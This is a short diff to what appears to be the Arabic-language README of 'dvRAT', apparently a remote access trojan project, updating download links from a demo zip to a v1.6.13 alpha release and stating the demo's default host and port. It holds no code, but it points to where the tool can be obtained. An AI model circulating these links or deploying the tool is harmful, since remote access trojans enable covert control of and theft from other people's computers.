@@ -117,8 +117,7 @@ IG: @dvr1t , @jUsTaLgHaMdi\
 EMAIL: devilrat.sa@gmail.com
   
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------
-لتحميل نسخة 0.0.1 تجريبية <a href="https://cdn.justalghamdi.xyz/dvRAT_v0.1_demo.zip" target="_blank">من هنا</a>
-أيضا يمكنك <a href="https://github.com/justalghamdi/dvRAT/releases/tag/v0.0.1-pre-alpha" target="_blank">من هنا</a>
+لتحميل نسخة 1.6.13 تجريبية <a href="https://github.com/justalghamdi/dvRAT/releases/tag/v1.6.13-alpha" target="_blank">من هنا</a>
 \
 البورت في النسخة التجريبية = 8080 أما الهوست = 127.0.0.1
 \
